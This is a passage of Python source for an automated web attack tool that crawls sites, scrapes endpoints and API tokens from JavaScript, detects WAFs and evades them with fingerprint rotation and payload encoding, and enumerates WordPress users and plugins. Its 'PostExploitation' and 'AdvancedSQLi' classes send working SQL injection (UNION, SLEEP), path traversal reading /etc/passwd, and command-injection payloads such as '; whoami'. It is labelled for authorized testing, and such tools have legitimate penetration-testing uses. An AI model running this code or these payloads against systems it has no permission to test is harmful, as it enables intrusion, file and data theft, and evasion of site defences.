    def has_xss_indicator(cls, html: str, payload: str) -> bool:
        return payload in html

    @classmethod
    def has_lfi_indicator(cls, html: str) -> bool:
        return any(re.search(p, html, re.I) for p in cls.LFI_PATTERNS)

    @classmethod
    def has_cmd_output(cls, html: str) -> bool:
        return any(re.search(p, html, re.I) for p in cls.CMD_OUTPUT_PATTERNS)

    @classmethod
    def detect_error_type(cls, html: str) -> Tuple[Optional[str], Optional[str]]:
        for patterns, error_type in cls.ERROR_PATTERNS:
            for pattern in patterns:
                match = re.search(pattern, html, re.I)
                if match:
                    return error_type, match.group()
        return None, None

# ==================== JS Intelligence ====================
class JSIntelligence:
    """JavaScript analysis for endpoint discovery"""

    def __init__(self):
        self.endpoints = set()
        self.tokens = set()
        self.headers = set()
        self._cache = {}

    async def analyze_url(self, js_url: str, requester) -> Dict:
        if js_url in self._cache:
            return self._cache[js_url]

        try:
            resp = await requester(js_url)
            if not resp or resp.status_code != 200:
                return {}

            content = resp.text
            endpoints = set()
            tokens = set()

            url_patterns = [
                r'["\'](/[a-zA-Z0-9_\-/]+)["\']',
                r'["\'](https?://[^"\']+)["\']',
                r'url:\s*["\']([^"\']+)["\']',
                r'endpoint:\s*["\']([^"\']+)["\']',
                r'baseURL:\s*["\']([^"\']+)["\']',
                r'apiUrl:\s*["\']([^"\']+)["\']'
            ]

            for pat in url_patterns:
                for match in re.findall(pat, content):
                    if match.startswith('/'):
                        endpoints.add(urljoin(js_url, match))
                    elif match.startswith('http'):
                        endpoints.add(match)

            token_patterns = [
                r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}',
                r'api[_-]?key["\']\s*[:=]\s*["\']([a-zA-Z0-9]{20,})["\']',
                r'token["\']\s*[:=]\s*["\']([a-zA-Z0-9_-]{20,})["\']'
            ]

            for pat in token_patterns:
                for match in re.findall(pat, content):
                    tokens.add(match)

            if 'admin' in content or 'api' in content:
                deep = self._parse_ast(content, js_url)
                endpoints.update(deep.get('endpoints', []))
                tokens.update(deep.get('tokens', []))

            result = {
                'endpoints': list(endpoints),
                'tokens': list(tokens),
                'headers': []
            }

            self._cache[js_url] = result
            return result

        except Exception as e:
            logger.debug(f"JS analysis error for {js_url}: {e}")
            return {}

    def _parse_ast(self, code: str, base_url: str) -> Dict:
        try:
            import esprima
            ast = esprima.parseScript(code, tolerant=True)
        except:
            return {}

        endpoints = set()
        tokens = set()
        variables = {}

        def traverse(node):
            if node.type == 'VariableDeclarator' and node.init:
                if node.id.type == 'Identifier':
                    var_name = node.id.name
                    if node.init.type == 'Literal':
                        variables[var_name] = node.init.value
                    elif node.init.type == 'BinaryExpression':
                        left = get_literal(node.init.left, variables)
                        right = get_literal(node.init.right, variables)
                        if left and right:
                            variables[var_name] = str(left) + str(right)

            if node.type == 'CallExpression' and node.callee:
                callee = node.callee
                if callee.property and callee.property.name in ['fetch', 'post', 'get', 'put', 'delete', 'request']:
                    args = node.arguments
                    if args and args[0].type == 'Literal':
                        endpoints.add(args[0].value)
                    elif args and args[0].type == 'Identifier' and args[0].name in variables:
                        endpoints.add(variables[args[0].name])

            if node.type == 'ObjectExpression':
                for prop in node.properties:
                    if prop.key.type == 'Identifier' and prop.key.name in ['url', 'endpoint', 'api']:
                        if prop.value.type == 'Literal':
                            endpoints.add(prop.value.value)

            if node.type == 'Literal' and isinstance(node.value, str):
                if len(node.value) > 20 and re.match(r'^[A-Za-z0-9_\-\.]+$', node.value):
                    tokens.add(node.value)

            for key in node:
                if isinstance(node[key], list):
                    for item in node[key]:
                        if isinstance(item, dict):
                            traverse(item)
                elif isinstance(node[key], dict):
                    traverse(node[key])

        def get_literal(node, vars):
            if node.type == 'Literal':
                return node.value
            elif node.type == 'Identifier' and node.name in vars:
                return vars[node.name]
            return None

        traverse(ast)

        full_endpoints = set()
        for ep in endpoints:
            if ep.startswith('/'):
                full_endpoints.add(urljoin(base_url, ep))
            else:
                full_endpoints.add(ep)

        return {'endpoints': list(full_endpoints), 'tokens': list(tokens)}

# ==================== Browser Crawler ====================
class BrowserCrawler:
    """Headless browser crawler with network monitoring"""

    def __init__(self, pool: BrowserContextPool, config: Config):
        self.pool = pool
        self.config = config
        self.human_config = config.data.get('human_behavior', {}) or {}
        self.collected_requests = set()
        self._stats = {'pages': 0, 'links': 0, 'forms': 0}

    async def _safe_goto(self, page, url: str) -> bool:
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=10000)
            return True
        except Exception as e:
            logger.debug(f"[Crawler] goto failed for {url}: {e}")
            return False

    async def crawl(self, url: str, depth: int = 2) -> Tuple[Dict[str, Any], Set[str]]:
        endpoints = {}
        visited = set()
        network_requests = set()
        queue = asyncio.Queue()
        await queue.put((url, 0))

        while not queue.empty():
            current_url, cur_depth = await queue.get()
            if cur_depth > depth or current_url in visited:
                continue

            visited.add(current_url)
            logger.info(f"[Crawler] Visiting: {current_url} (depth={cur_depth})")

            ctx = await self.pool.get_context()
            try:
                page = await ctx.new_page()

                def handle_request(request):
                    network_requests.add(request.url)

                page.on("request", handle_request)

                if self.human_config.get('random_delay', True):
                    dmin = float(self.human_config.get('delay_min', 0.2))
                    dmax = float(self.human_config.get('delay_max', 1.5))
                    await asyncio.sleep(random.uniform(dmin, dmax))

                ok = await self._safe_goto(page, current_url)
                if not ok:
                    await page.close()
                    continue

                if self.human_config.get('mouse_move', True):
                    w = await page.evaluate("window.innerWidth")
                    h = await page.evaluate("window.innerHeight")
                    x = random.randint(0, max(1, int(w)))
                    y = random.randint(0, max(1, int(h)))
                    await page.mouse.move(x, y, steps=random.randint(1, 10))

                if self.human_config.get('scroll', True):
                    delta = random.randint(100, 500)
                    await page.evaluate(f"window.scrollBy(0, {delta})")

                links = await page.evaluate(
                    "Array.from(document.querySelectorAll('a')).map(a => a.href)"
                )
                forms = await page.evaluate("""
                    () => Array.from(document.forms).map(f => ({
                        action: f.action,
                        method: f.method,
                        inputs: Array.from(f.elements).map(e => ({
                            name: e.name,
                            type: e.type,
                            id: e.id
                        })).filter(n => n.name)
                    }))
                """)
                js_files = await page.evaluate(
                    "Array.from(document.scripts).map(s => s.src).filter(s => s)"
                )

                endpoints[current_url] = {
                    'url': current_url,
                    'method': 'GET',
                    'params': [],
                    'forms': forms,
                    'js_files': js_files,
                    'api_calls': []
                }

                self._stats['pages'] += 1
                self._stats['links'] += len(links)
                self._stats['forms'] += len(forms)

                logger.info(f"[Crawler] Extracted {len(links)} links / {len(forms)} forms from: {current_url}")

                await page.close()

                origin = urlparse(current_url)
                base = f"{origin.scheme}://{origin.netloc}"
                for link in links:
                    if link and link.startswith(base) and link not in visited:
                        await queue.put((link, cur_depth + 1))

            finally:
                await self.pool.release_context(ctx)

        logger.info(f"[Crawler] Stats: {self._stats}")
        return endpoints, network_requests

# ==================== LLM Cache ====================
class LLMCache:
    """LLM-based strategy caching"""

    def __init__(self, db: AsyncDB, url: str, model: str):
        self.db = db
        self.url = url
        self.model = model
        self.enabled = True
        self._local_cache = {}

    async def get_strategy(self, tech_stack: str) -> Optional[Dict]:
        if not tech_stack:
            return None
        if tech_stack in self._local_cache:
            return self._local_cache[tech_stack]

        tech_hash = hashlib.sha256(tech_stack.encode()).hexdigest()
        async with self.db.conn.execute(
            "SELECT strategy FROM tech_strategies WHERE tech_hash = ?", (tech_hash,)
        ) as cur:
            row = await cur.fetchone()
            if row:
                strategy = json.loads(row[0])
                self._local_cache[tech_stack] = strategy
                return strategy
        return None

    async def store_strategy(self, tech_stack: str, strategy: Dict):
        tech_hash = hashlib.sha256(tech_stack.encode()).hexdigest()
        await self.db.conn.execute(
            "INSERT OR REPLACE INTO tech_strategies (tech_hash, tech_stack, strategy, created_at) VALUES (?, ?, ?, ?)",
            (tech_hash, tech_stack, json.dumps(strategy), time.time())
        )
        await self.db.conn.commit()
        self._local_cache[tech_stack] = strategy

# ==================== Adaptive Engine ====================
class AdaptiveEngine:
    """Adaptive rate limiting and concurrency control"""

    def __init__(self, config: Config):
        self.config = config
        self.timeout_count = 0
        self.forbidden_count = 0
        self.current_delay = 0.0
        self.current_concurrency = config.data['threads']
        self.fingerprint_rotation_needed = False
        self._lock = threading.Lock()
        self._stats = {'timeouts': 0, 'forbidden': 0, 'adaptations': 0}

    def record_timeout(self):
        with self._lock:
            self.timeout_count += 1
            self._stats['timeouts'] += 1
            if self.timeout_count > 5:
                self.current_delay = min(5.0, self.current_delay * 1.5)
                self.current_concurrency = max(2, self.current_concurrency // 2)
                self._stats['adaptations'] += 1
                logger.info(f"Adaptive: increased delay to {self.current_delay:.2f}s, concurrency to {self.current_concurrency}")
                self.timeout_count = 0

    def record_forbidden(self):
        with self._lock:
            self.forbidden_count += 1
            self._stats['forbidden'] += 1
            if self.forbidden_count > 3:
                self.fingerprint_rotation_needed = True
                self._stats['adaptations'] += 1
                logger.info("Adaptive: 403 pattern detected, will rotate TLS fingerprint")
                self.forbidden_count = 0

    def get_delay(self) -> float:
        return self.current_delay

    def get_concurrency(self) -> int:
        return self.current_concurrency

    def should_rotate_fingerprint(self) -> bool:
        if self.fingerprint_rotation_needed:
            self.fingerprint_rotation_needed = False
            return True
        return False

    def get_stats(self) -> Dict:
        return self._stats.copy()

# ==================== WAF Detection ====================
class WAFDetector:
    """WAF detection with adaptive bypass recommendations"""

    KNOWN_WAF_SIGNATURES = {
        'x-sucuri-id': 'Sucuri',
        'x-akamai-transformed': 'Akamai',
        'cf-ray': 'Cloudflare',
        'x-cdn': 'Generic CDN',
        'server': {
            'cloudflare': 'Cloudflare',
            'sucuri': 'Sucuri',
            'akamai': 'Akamai'
        }
    }

    BYPASS_RECOMMENDATIONS = {
        'Cloudflare': ['lowercase method', 'chunked encoding', 'HTTP/1.0'],
        'Akamai': ['remove Accept-Encoding', 'custom headers'],
        'ModSecurity': ['multi-encoding', 'case variation'],
        'Sucuri': ['obfuscated headers', 'IP rotation']
    }

    def __init__(self, config: Config):
        self.config = config
        self.waf_type = None
        self.waf_level = 0
        self.bypass_methods = []

    async def detect(self, requester, url: str) -> str:
        if not self.config.data.get('detect_waf', True):
            return "unknown"

        try:
            result = subprocess.run(
                ['identYwaf', url], capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    if "blind match:" in line:
                        self.waf_type = line.split(":")[1].strip().split()[0]
                        break
                if self.waf_type:
                    logger.info(f"[WAF] Detected: {self.waf_type}")
        except Exception as e:
            logger.debug(f"identYwaf error: {e}")

        resp = await requester(url)
        if resp:
            headers = resp.headers
            for header, waf in self.KNOWN_WAF_SIGNATURES.items():
                if header in headers:
                    if isinstance(waf, dict):
                        server = headers.get('server', '').lower()
                        for sig, waf_name in waf.items():
                            if sig in server:
                                self.waf_type = waf_name
                                break
                    else:
                        self.waf_type = waf
                    break

        self._set_evasion_level()
        return self.waf_type or "unknown"

    def _set_evasion_level(self):
        if self.waf_type in ['Cloudflare', 'Sucuri', 'Akamai']:
            self.waf_level = 1
            self.bypass_methods = self.BYPASS_RECOMMENDATIONS.get(self.waf_type, [])
        elif self.waf_type in ['ModSecurity', 'Comodo']:
            self.waf_level = 2
        else:
            self.waf_level = 0
        logger.info(f"[WAF] Evasion level: {self.waf_level}, methods: {self.bypass_methods}")

    def get_level(self) -> int:
        return self.waf_level

    def get_bypass_methods(self) -> List[str]:
        return self.bypass_methods

# ==================== Backend Detector ====================
class BackendDetector:
    """Backend technology detection"""

    TECH_SIGNATURES = {
        'PHP': ['PHPSESSID', 'php', 'Laravel', 'Symfony', 'CodeIgniter'],
        'Java': ['JSESSIONID', 'JSESSION_ID', 'Tomcat', 'JBoss', 'Spring'],
        'ASP.NET': ['ASP.NET_SessionId', 'ASP.NET', 'X-AspNet-Version'],
        'Python': ['Django', 'Flask', 'Pyramid', '__pycache__', 'wsgi'],
        'Ruby': ['Ruby on Rails', 'rack', '.rhtml'],
        'Node.js': ['Connect', 'Express', 'Node.js', 'Next.js'],
        'Go': ['Go-http-client', 'net/http']
    }

    CMS_SIGNATURES = {
        'WordPress': ['wp-content', 'wp-includes', 'wordpress', 'wp-json'],
        'Joomla': ['option=com', 'joomla', 'Joomla!'],
        'Drupal': ['drupal', 'node/', 'sites/default'],
        'Magento': ['MAGE_CODE', 'magento', 'catalog/product'],
        'Shopify': ['shopify', 'cdn.shopify.com']
    }

    def __init__(self, config: Config):
        self.config = config
        self.backend_info = {}

    async def detect(self, requester, url: str) -> Dict:
        if not self.config.data.get('detect_backend', True):
            return {}

        resp = await requester(url)
        if not resp:
            return {}

        headers = resp.headers
        self.backend_info['server'] = headers.get('server', 'unknown')
        self.backend_info['powered_by'] = headers.get('x-powered-by', 'unknown')

        cookies = str(headers.get('set-cookie', ''))
        for tech, cookies_list in [('PHP', ['PHPSESSID']), ('Java', ['JSESSIONID']), ('ASP.NET', ['ASP.NET_SessionId'])]:
            if any(c in cookies for c in cookies_list):
                self.backend_info['language'] = tech

        powered = headers.get('x-powered-by', '')
        for tech, sigs in self.TECH_SIGNATURES.items():
            if any(s.lower() in powered.lower() for s in sigs if len(s) > 3):
                self.backend_info['language'] = tech

        text = resp.text.lower()
        for cms, sigs in self.CMS_SIGNATURES.items():
            if any(s.lower() in text for s in sigs if len(s) > 3):
                self.backend_info['cms'] = cms

        soup = BeautifulSoup(resp.text, BEAUTIFULSOUP_PARSER)
        meta = soup.find('meta', {'name': 'generator'})
        if meta and meta.get('content'):
            content = meta['content']
            for cms in self.CMS_SIGNATURES:
                if cms.lower() in content.lower():
                    self.backend_info['cms'] = cms

        logger.info(f"[Backend] Detected: {self.backend_info}")
        return self.backend_info

# ==================== Shared Host Detector ====================
class SharedHostDetector:
    """Shared hosting detection"""

    def __init__(self, config: Config):
        self.config = config
        self.shared_domains = []
        self.is_shared = False

    async def detect(self, ip: str) -> Tuple[bool, List[str]]:
        if not self.config.data.get('detect_shared_host', True):
            return False, []

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://api.hackertarget.com/reverseiplookup/?q={ip}",
                    timeout=10
                ) as resp:
                    if resp.status == 200:
                        data = await resp.text()
                        self.shared_domains = [
                            line.strip() for line in data.splitlines()
                            if line.strip() and not line.startswith('#')
                        ]
                        self.is_shared = len(self.shared_domains) > 1
                        logger.info(f"[Shared Host] Found {len(self.shared_domains)} domains on {ip}")
        except Exception as e:
            logger.debug(f"Shared host detection error: {e}")

        return self.is_shared, self.shared_domains

# ==================== WordPress Scanner ====================
class WordPressScanner:
    """Comprehensive WordPress security scanner"""

    COMMON_PLUGINS = [
        'akismet', 'wordpress-seo', 'jetpack', 'woocommerce', 'elementor',
        'contact-form-7', 'yoast-seo', 'all-in-one-seo', 'wordfence',
        'sucuri-scanner', 'wp-super-cache', 'w3-total-cache', 'popup-maker',
        'gravityforms', 'revslider', 'wpforms', 'easy-digital-downloads'
    ]

    def __init__(self, config: Config, requester):
        self.config = config
        self.requester = requester
        self.base_url = None
        self.info = {}

    async def scan(self, url: str) -> Dict:
        if not self.config.data.get('wordpress_scan', True):
            return {}

        self.base_url = url.rstrip('/')

        resp = await self.requester(self.base_url)
        if not resp or 'wp-content' not in resp.text and 'wp-includes' not in resp.text:
            return {}

        logger.info("[WordPress] Detected, starting comprehensive scan")

        self.info['version'] = await self._get_version()
        self.info['users'] = await self._enumerate_users()
        self.info['plugins'] = await self._enumerate_plugins()
        self.info['themes'] = await self._enumerate_themes()
        self.info['xmlrpc'] = await self._check_xmlrpc()
        self.info['readme'] = await self._check_readme()
        self.info['uploads'] = await self._check_uploads()
        self.info['debug_log'] = await self._check_debug_log()
        self.info['wp_config'] = await self._check_wp_config()

        return self.info

    async def _get_version(self) -> Optional[str]:
        resp = await self.requester(self.base_url)
        if resp:
            soup = BeautifulSoup(resp.text, BEAUTIFULSOUP_PARSER)
            meta = soup.find('meta', {'name': 'generator'})
            if meta and meta.get('content'):
                match = re.search(r'WordPress\s+([\d\.]+)', meta['content'])
                if match:
                    return match.group(1)

        readme = await self.requester(urljoin(self.base_url, "/readme.html"))
        if readme:
            match = re.search(r'Version\s+([\d\.]+)', readme.text)
            if match:
                return match.group(1)

        rss = await self.requester(urljoin(self.base_url, "/feed/"))
        if rss:
            match = re.search(r'https?://wordpress\.org/\?v=([\d\.]+)', rss.text)
            if match:
                return match.group(1)

        return None

    async def _enumerate_users(self) -> List[str]:
        users = []
        rest_url = urljoin(self.base_url, "/wp-json/wp/v2/users")
        resp = await self.requester(rest_url)
        if resp and resp.status_code == 200:
            try:
                data = json.loads(resp.text)
                for user in data:
                    if isinstance(user, dict):
                        users.append(user.get('slug') or user.get('name'))
            except:
                pass

        for i in range(1, 15):
            url = urljoin(self.base_url, f"/?author={i}")
            resp = await self.requester(url)
            if resp and resp.status_code == 200:
                soup = BeautifulSoup(resp.text, BEAUTIFULSOUP_PARSER)
                link = soup.find('a', href=re.compile(r'/author/'))
                if link and link.get('href'):
                    name = link.get('href').split('/')[-2]
                    users.append(name)

        return list(set(users))

    async def _enumerate_plugins(self) -> List[Dict]:
        plugins = []
        resp = await self.requester(self.base_url)
        if resp:
            matches = re.findall(r'/wp-content/plugins/([^/]+)/', resp.text)
            for plugin in set(matches):
                plugins.append({'name': plugin, 'source': 'html'})

        for plugin in self.COMMON_PLUGINS:
            url = urljoin(self.base_url, f"/wp-content/plugins/{plugin}/readme.txt")
            resp = await self.requester(url)
            if resp and resp.status_code == 200:
                match = re.search(r'Stable tag:\s*([\d\.]+)', resp.text)
                version = match.group(1) if match else 'unknown'
                plugins.append({'name': plugin, 'version': version, 'source': 'readme'})

        return plugins

    async def _enumerate_themes(self) -> List[str]:
        themes = []
        resp = await self.requester(self.base_url)
        if resp:
            matches = re.findall(r'/wp-content/themes/([^/]+)/', resp.text)
            themes.extend(matches)
        return list(set(themes))

    async def _check_xmlrpc(self) -> Dict:
        url = urljoin(self.base_url, "/xmlrpc.php")
        resp = await self.requester(url)
        return {
            'enabled': resp and resp.status_code == 200 and "XML-RPC" in resp.text,
            'pingbacks': await self._check_pingbacks()
        }

    async def _check_pingbacks(self) -> bool:
        try:
            xml = '''<?xml version="1.0"?>
            <methodCall><methodName>pingback.ping</methodName>
            <params><param><value><string>http://test.com</string></value></param>
            <param><value><string>http://test.com</string></value></param></params>
            </methodCall>'''
            resp = await self.requester(
                urljoin(self.base_url, "/xmlrpc.php"),
                method="POST",
                data={'xml': xml}
            )
            return resp and "faultCode" not in resp.text
        except:
            return False

    async def _check_readme(self) -> bool:
        url = urljoin(self.base_url, "/readme.html")
        resp = await self.requester(url)
        return resp and resp.status_code == 200

    async def _check_uploads(self) -> bool:
        url = urljoin(self.base_url, "/wp-content/uploads/")
        resp = await self.requester(url)
        return resp and resp.status_code == 200 and "Index of" in resp.text

    async def _check_debug_log(self) -> bool:
        paths = [
            '/wp-content/debug.log',
            '/debug.log',
            '/wp-admin/debug.log'
        ]
        for path in paths:
            url = urljoin(self.base_url, path)
            resp = await self.requester(url)
            if resp and resp.status_code == 200 and 'PHP' in resp.text:
                return True
        return False

    async def _check_wp_config(self) -> bool:
        url = urljoin(self.base_url, "/wp-config.php")
        resp = await self.requester(url)
        return resp and resp.status_code == 200 and 'DB_NAME' in resp.text

# ==================== Async Request Core ====================
class AsyncRequestCore:
    """Core async HTTP request handler with optimizations"""

    def __init__(self, config: Config, scope: StrictScopeController, dedup,
                 adaptive: AdaptiveEngine, waf_detector: WAFDetector):
        self.config = config
        self.scope = scope
        self.dedup = dedup
        self.adaptive = adaptive
        self.waf_detector = waf_detector
        self.session = None
        self.semaphore = None
        self.rate_limiter = AdaptiveRate(
            base_rps=config.data['rate_limit']['max_requests_per_second'],
            backoff_factor=config.data['rate_limit']['backoff_factor']
        )
        self.evasion = AdvancedEvasion()
        self.waf_level = waf_detector.get_level()
        self.fingerprint_rotator = None
        self.llm_cache = None
        self._pending_cookies = None
        self._using_curl = False
        self._stats = {'requests': 0, 'success': 0, 'failures': 0}

    async def _create_session(self, cookies: Dict = None):
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

        self.semaphore = asyncio.Semaphore(self.adaptive.get_concurrency())

        connector = aiohttp.TCPConnector(
            ssl=ssl_ctx,
            limit=self.adaptive.get_concurrency(),
            limit_per_host=20,
            ttl_dns_cache=300
        )
        self.session = aiohttp.ClientSession(connector=connector)

        if cookies:
            self.session.cookie_jar.update_cookies(cookies)

    def _normalize_params_for_dedup(self, params: Any) -> Dict:
        if not isinstance(params, dict):
            return {}
        return params

    async def request(self, url: str, method: str = "GET", **kwargs) -> Optional[ResponseAdapter]:
        if self.scope.is_excluded(url) or self.scope.is_passive_only(url):
            return None

        if not self.scope.is_allowed(url):
            return None

        params = kwargs.get('params') or kwargs.get('data') or {}
        params = self._normalize_params_for_dedup(params)
        if not self.dedup.is_new(url, method, params):
            return None

        await self.rate_limiter.wait()

        if 'params' in kwargs and isinstance(kwargs['params'], dict):
            for k, v in list(kwargs['params'].items()):
                kwargs['params'][k] = self.evasion.apply(str(v), self.waf_level)

        headers = self._get_headers()
        if 'headers' in kwargs:
            headers.update(kwargs['headers'])
        kwargs['headers'] = headers

        if self.config.data['proxies']:
            kwargs['proxy'] = random.choice(self.config.data['proxies'])

        try:
            async with self.semaphore:
                start = time.time()
                method_upper = method.upper()

                if method_upper == "GET":
                    resp = await self.session.get(url, timeout=self.config.data['timeout'], **kwargs)
                elif method_upper == "POST":
                    resp = await self.session.post(url, timeout=self.config.data['timeout'], **kwargs)
                elif method_upper == "PUT":
                    resp = await self.session.put(url, timeout=self.config.data['timeout'], **kwargs)
                elif method_upper == "DELETE":
                    resp = await self.session.delete(url, timeout=self.config.data['timeout'], **kwargs)
                else:
                    resp = await self.session.request(method, url, timeout=self.config.data['timeout'], **kwargs)

                elapsed = time.time() - start

                body_bytes = await resp.read()
                try:
                    charset = resp.charset or 'utf-8'
                except:
                    charset = 'utf-8'
                body_text = body_bytes.decode(charset, errors='replace')

                adapted = ResponseAdapter(
                    status_code=resp.status,
                    text=body_text,
                    content=body_bytes,
                    elapsed=elapsed,
                    headers=dict(resp.headers),
                    url=url,
                    request_method=method,
                    request_headers=headers
                )

                self._stats['requests'] += 1
                if adapted.ok:
                    self._stats['success'] += 1
                else:
                    self._stats['failures'] += 1

                if elapsed > self.config.data['timeout'] * 0.8:
                    self.adaptive.record_timeout()
                if adapted.status_code == 403:
                    self.adaptive.record_forbidden()

                self.rate_limiter.record_response(adapted)
                self.scope.mark_scanned(url)

                return adapted

        except asyncio.TimeoutError:
            self.adaptive.record_timeout()
            return None
        except Exception as e:
            logger.debug(f"Request error: {e}")
            return None

    async def close(self):
        if self.session:
            await self.session.close()

    def _get_headers(self) -> Dict:
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }

    def set_waf_level(self, level: int):
        self.waf_level = level

    def set_cookies(self, cookies: Dict):
        self._pending_cookies = cookies

    def get_stats(self) -> Dict:
        return self._stats.copy()

class TLSFingerprintRotator:
    """TLS fingerprint rotation for evasion"""

    def __init__(self, config: Config):
        self.impersonates = config.data['evasion'].get('impersonate', ["chrome_120"])
        self.current_index = 0
        self._lock = threading.Lock()

    def get_fingerprint(self) -> str:
        with self._lock:
            fp = self.impersonates[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.impersonates)
            return fp

class AdaptiveRate:
    """Adaptive rate limiting with backoff"""

    def __init__(self, base_rps: float = 5.0, backoff_factor: float = 0.5, max_rps: float = 100.0):
        self.base_rps = base_rps
        self.current_rps = base_rps
        self.backoff_factor = backoff_factor
        self.max_rps = max_rps
        self.history = deque(maxlen=20)
        self.last_time = 0
        self._lock = asyncio.Lock()

    async def wait(self):
        async with self._lock:
            now = time.time()
            delay = 1.0 / self.current_rps
            elapsed = now - self.last_time
            if elapsed < delay:
                await asyncio.sleep(delay - elapsed)
            self.last_time = time.time()

    def record_response(self, response: ResponseAdapter):
        self.history.append(response)
        recent = list(self.history)[-5:]

        if any(r.status_code in (429, 403) for r in recent):
            self.current_rps = max(1, self.current_rps * 0.5)
        elif len(self.history) >= 10 and all(r.status_code == 200 for r in list(self.history)[-10:]):
            self.current_rps = min(self.max_rps, self.current_rps * 1.2)
        else:
            if self.current_rps < self.base_rps:
                self.current_rps = min(self.base_rps, self.current_rps * 1.05)

class AdvancedEvasion:
    """Basic evasion techniques (limited)"""

    def __init__(self):
        self.encodings = ['url', 'double', 'base64', 'random_case']

    def apply(self, payload: str, waf_level: int = 0) -> str:
        if waf_level == 0 or not isinstance(payload, str):
            return payload
        for enc in self.encodings[:waf_level+1]:
            if enc == 'url':
                payload = urllib.parse.quote(payload, safe='')
            elif enc == 'double':
                payload = urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
        return payload

# ==================== Request Deduplicator ====================
class RequestDeduplicator:
    """Request deduplication with bloom filter option"""

    def __init__(self):
        self.seen = set()
        self._lock = threading.Lock()
        self._stats = {'hits': 0, 'misses': 0}

    def fingerprint(self, url: str, method: str, params: Dict) -> str:
        if not isinstance(params, dict):
            params = {}
        return hashlib.sha256(f"{method}:{url}:{sorted(params.items())}".encode()).hexdigest()

    def is_new(self, url: str, method: str, params: Dict) -> bool:
        fp = self.fingerprint(url, method, params)
        with self._lock:
            if fp in self.seen:
                self._stats['hits'] += 1
                return False
            self.seen.add(fp)
            self._stats['misses'] += 1
            return True

    def get_stats(self) -> Dict:
        return self._stats.copy()

# ==================== Post-Exploitation ====================
class PostExploitation:
    """Post-exploitation data extraction (for authorized testing)"""

    def __init__(self, requester, config: Config, browser_pool):
        self.requester = requester
        self.config = config
        self.browser_pool = browser_pool
        self.extracted_data = {}

    async def extract_sqli_data(self, url: str, param: str, method: str, db_type: str = 'mysql') -> Optional[str]:
        for cols in range(1, 10):
            if db_type.lower() == 'mysql':
                payload = f"' UNION SELECT {','.join(['NULL']*cols)}--"
            else:
                payload = f"' UNION SELECT {','.join(['NULL']*cols)}--"

            resp = await self._send(url, param, payload, method)
            if resp and "error" not in resp.text.lower():
                query = "sqlite_version()" if 'sqlite' in db_type.lower() else "version()"
                parts = [query] + ['NULL']*(cols-1)
                payload = f"' UNION SELECT {','.join(parts)}--"
                resp = await self._send(url, param, payload, method)
                if resp:
                    return resp.text[:500]
        return None

    async def extract_lfi_file(self, url: str, param: str, method: str, file: str = "/etc/passwd") -> Optional[str]:
        payloads = [
            f"../../../../{file}",
            f"....//....//{file}",
            f"php://filter/convert.base64-encode/resource={file}"
        ]
        for payload in payloads:
            resp = await self._send(url, param, payload, method)
            if resp and ("root:x:0:0:" in resp.text or "base64" in resp.text.lower()):
                return resp.text[:500]
        return None

    async def extract_cmd_output(self, url: str, param: str, method: str, cmd: str = "whoami") -> Optional[str]:
        payloads = [f"; {cmd}", f"| {cmd}", f"&& {cmd}"]
        for payload in payloads:
            resp = await self._send(url, param, payload, method)
            if resp and ("uid=" in resp.text or "root" in resp.text):
                return resp.text[:200]
        return None

    async def _send(self, url: str, param: str, payload: str, method: str):
        if method.upper() == "GET":
            return await self.requester(url, params={param: payload})
        else:
            return await self.requester(url, data={param: payload})

# ==================== Advanced SQLi Detection ====================
class AdvancedSQLi:
    """Advanced SQL injection detection with verification"""

    def __init__(self, requester, config: Config):
        self.requester = requester
        self.config = config
        self.verification_cfg = config.data['verification']

    async def _get_baseline(self, url: str, param: str, method: str) -> Dict:
        responses = []
        for _ in range(self.verification_cfg['baseline_samples']):
            resp = await self._send(url, param, "1", method)
            if resp:
                responses.append(resp)

        if not responses:
            return {}

        lengths = [len(r.content) for r in responses]
        dom_hashes = [self._dom_hash(r.text) for r in responses]

        return {
            'avg_length': sum(lengths) / len(lengths),
            'length_variance': max(lengths) - min(lengths),
            'dom_hashes': dom_hashes,
            'timings': [r.elapsed for r in responses]
        }

    def _dom_hash(self, html: str) -> str:
        soup = BeautifulSoup(html, BEAUTIFULSOUP_PARSER)
        structure = ''.join(tag.name for tag in soup.find_all())
        return hashlib.sha256(structure.encode()).hexdigest()

    async def test_boolean(self, url: str, param: str, method: str = "GET") -> Tuple[bool, float, str]:
        baseline = await self._get_baseline(url, param, method)
        if not baseline:
            return False, 0.0, "no_baseline"

        true_payload = "1' AND '1'='1"
        false_payload = "1' AND '1'='2"

        true_resp = await self._send(url, param, true_payload, method)
        false_resp = await self._send(url, param, false_payload, method)

        if not true_resp or not false_resp:
            return False, 0.0, "no_resp"

        true_len = len(true_resp.content)
        false_len = len(false_resp.content)

        if abs(true_len - false_len) > baseline['length_variance']:
            return True, 0.85, "boolean_length"

        return False, 0.0, "no_change"

    async def test_time(self, url: str, param: str, method: str = "GET", delay: int = 5) -> Tuple[bool, float]:
        baseline = await self._get_baseline(url, param, method)
        baseline_time = sum(baseline.get('timings', [0])) / max(1, len(baseline.get('timings', [1])))

        payload = f"' OR SLEEP({delay})--"
        start = time.time()
        resp = await self._send(url, param, payload, method)
        elapsed = time.time() - start

        if resp and elapsed - baseline_time >= delay - 1:
            return True, 0.95

        return False, 0.0

    async def test_union(self, url: str, param: str, method: str = "GET") -> Tuple[bool, float]:
        payload = "' UNION SELECT NULL--"
        resp = await self._send(url, param, payload, method)
        if resp and "error" not in resp.text.lower():
            return True, 0.7
        return False, 0.0

    async def _send(self, url: str, param: str, payload: str, method: str):
        if method.upper() == "GET":
            return await self.requester(url, params={param: payload})
        else:
            return await self.requester(url, data={param: payload})

# ==================== Attack Graph ====================
class AttackGraph:
    """Attack path visualization using graph theory"""

    def __init__(self):
        if nx:
            self.graph = nx.DiGraph()
        else:
            self.graph = None

